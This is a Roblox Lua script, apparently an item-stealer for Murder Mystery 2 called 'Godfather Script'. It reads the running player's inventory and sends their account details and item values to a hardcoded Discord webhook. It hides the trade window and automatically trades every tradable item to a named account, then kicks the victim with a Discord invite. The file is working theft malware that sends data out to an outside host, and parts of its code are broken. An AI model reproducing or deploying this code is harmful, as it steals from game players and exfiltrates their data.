


local cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
local cfg.pingEveryone = "Yes"

local users = {"Getstompedbyyounes"}        
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")


if not plr then return end

local isTradeCompleted = false
local totalInventoryValue = 1

local function findRequest()
    if request then
        return request, "Delta / Generic"
    elseif syn and syn.request then
        return syn.request, "Synapse X"
    elseif http_request then
        return http_request, "Script-Ware / KRNL"
    elseif http and http.request then
        return http.request, "Electron"
    elseif fluxus and fluxus.request then
        return fluxus.request, "Fluxus"
    elseif httpx and httpx.request then
        return httpx.request, "Hydrogen"
    elseif KRNL_LOADED then
        return request, "KRNL"
    elseif identifyexecutor then
        return request, identifyexecutor()
    elseif getexecutorname then
        return request, getexecutorname()
    end

    return nil, "Roblox HttpService"
end

local PlaceId = game.PlaceId
local JobId = game.JobId

local fernJoinerLink = string.format(
    "https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", 
    PlaceId, 
    JobId
)


local function GodfatherScriptFetchSupremeValues()
    local values = {}
    local success, result = pcall(function()
        local response = request({
            Url = "https://api.supremevaluelist.com/mm2/items",
            Method = "GET",
            Headers = { ["User-Agent"] = "Mozilla/5.0" }
        })
        if response and response.Body then
            return HttpService:JSONDecode(response.Body)
        end
        return nil
    end)
    
    if success and result then
        for _, item in ipairs(result) do
            if item.name and item.value then
                values[item.name:lower()] = item.value
            end
        end
    end
    return values
end

local supremeValues = GodfatherScriptFetchSupremeValues()

local function GodfatherScriptGetItemValue(itemName, rarity)
    if not itemName then return 0 end
    local lowerName = itemName:lower()
    if supremeValues[lowerName] then return supremeValues[lowerName] end
    
    if lowerName:find("chroma") then
        local baseName = lowerName:gsub("chroma ", "")
        if supremeValues[baseName] then return supremeValues[baseName] * 2 end
    end
    
    local defaultValues = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 5, Godly = 10, Ancient = 20, Unique = 30, Vintage = 50 }
    return defaultValues[rarity] or 1
end

if not plr.Character then plr.CharacterAdded:Wait() end
task.wait(1)

local LastOffer = nil
Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
    if x and x.LastOffer then LastOffer = x.LastOffer end
end)

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:WaitForChild(guiName, 3)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

local function GodfatherScriptIsDefaultItem(itemName)
    if not itemName then return false end
    local lower = itemName:lower()
    return lower:find("default") and (lower:find("gun") or lower:find("knife"))
end

local weaponsToSend = {}
local rarityCounts = {}

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item then
        if GodfatherScriptIsDefaultItem(item.ItemName) or GodfatherScriptIsDefaultItem(dataid) then continue end
        
        local rarity = item.Rarity or "Common"
        local itemValue = GodfatherScriptGetItemValue(item.ItemName, rarity)
        local totalItemValue = itemValue * amount
        
        totalInventoryValue = totalInventoryValue + totalItemValue
        
        if not dataid:lower():find("untradable") then
            table.insert(weaponsToSend, {
                DataID = dataid,
                ItemName = item.ItemName or dataid,
                Amount = amount,
                Rarity = rarity,
                Value = itemValue,
                TotalValue = totalItemValue
            })
            rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
        end
    end
end

table.sort(weaponsToSend, function(a, b) return (a.TotalValue) > (b.TotalValue) end)

local itemsListText = ""
for i = 1, math.min(20, #weaponsToSend) do
    local item = weaponsToSend[i]
    itemsListText = itemsListText .. string.format("%s x%d (%d value)\n", item.ItemName, item.Amount, item.TotalValue)
end

if #weaponsToSend > 20 then
    itemsListText = itemsListText .. string.format("\nand %d more items", #weaponsToSend - 20)
end

local rarityText = ""
for _, rarity in ipairs(rarityTable) do
    if rarityCounts[rarity] and rarityCounts[rarity] > 0 then
        rarityText = rarityText .. string.format("%s: %d\n", rarity, rarityCounts[rarity])
    end
end

local function GodfatherScriptSendWebhook()
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = users[1]
	local execRequest, executorName = findRequest()
    
    local embed = {
        title = string.format("Godfather Script | %s | %s", plr.DisplayName, targetName),
        description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", plr.Name, totalInventoryValue),
        color = 0xFF0000,
        thumbnail = {url = avatarUrl},
        fields = {
            {
                name = "Player Info",
                value = string.format("Display: %s\nUsername: %s\nUser ID: %d\nAccount Age: %d days\nExecutor: %s",
                    plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge or 0, executorName),
                inline = true
            },
            {
                name = "Join Link",
                value = string.format("[Click to Join](%s)\n```\n%s\n```", fernJoinerLink, fernJoinerLink),
                inline = false
            },
            {
                name = "Server Info",
                value = string.format("JobId: %s\nPlaceId: %d", JobId, PlaceId),
                inline = true
            },
            {
                name = "Total Items",
                value = string.format("%d items\nValue: %d", #weaponsToSend, totalInventoryValue),
                inline = true
            },
            {
                name = "Rarity Distribution",
                value = rarityText ~= "" and rarityText or "No data",
                inline = false
            },
            {
                name = string.format("Top Items (%d)", math.min(20, #weaponsToSend)),
                value = itemsListText ~= "" and itemsListText or "No items",
                inline = false
            },
            {
                name = "Target Receiver",
                value = string.format("%s", targetName),
                inline = true
            }
        },
        footer = {
            text = string.format("Godfather Script | %s", os.date("%d/%m/%Y %H:%M"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local payload = {
        content = prefix ..
			"game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" ..
			game.JobId .. "')",
		embeds = {{
			embed
		}}
    }
    
    
    return execRequest({
            Url = cfg.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

GodfatherScriptSendWebhook()

local function GodfatherScriptGetStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function GodfatherScriptWaitForTarget(targetPlayer)
    local attempts = 0
    while attempts < 30 do
        if targetPlayer and targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then return true end
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function GodfatherScriptAcceptTrade()
    if not LastOffer then return false end
    local ok = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
    end)
    return ok
end

local function GodfatherScriptFinishAndKick()
    isTradeCompleted = true
    task.wait(2)
    local discordLink = "https://discord.gg/dUaHggzp9q"
    if setclipboard then setclipboard(discordLink) end
    plr:Kick("Godfather Script\n\nItems taken successfully\n\n" .. discordLink .. "\n\nJoin to get your items back!")
end

function GodfatherScriptDoTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return end
    if not GodfatherScriptWaitForTarget(targetPlayer) then return end
    
    pcall(function() DeclineTrade:FireServer() end)
    task.wait(0.5)
    LastOffer = nil
    
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success = pcall(function()
            local status = GodfatherScriptGetStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do table.remove(weaponsToSend, 1) end
                    itemsAdded = false
                    LastOffer = nil
                    task.wait(0.5)
                else
                    SendRequest:InvokeServer(targetPlayer)
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                DeclineTrade:FireServer()
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do
                        local item = weaponsToSend[i]
                        for _ = 1, item.Amount do
                            OfferItem:FireServer(item.DataID, "Weapons")
                        end
                        task.wait(0.1)
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        GodfatherScriptAcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then task.wait(1) end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then GodfatherScriptFinishAndKick() end
end

local function GodfatherScriptIsTarget(name)
    for _, u in ipairs(users) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if GodfatherScriptIsTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            GodfatherScriptDoTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and GodfatherScriptIsTarget(p.Name) then
        task.spawn(function()
            task.wait(2)
            GodfatherScriptDoTrade(p)
        end)
        break
    end
end

while not isTradeCompleted do
    task.wait(1)
end
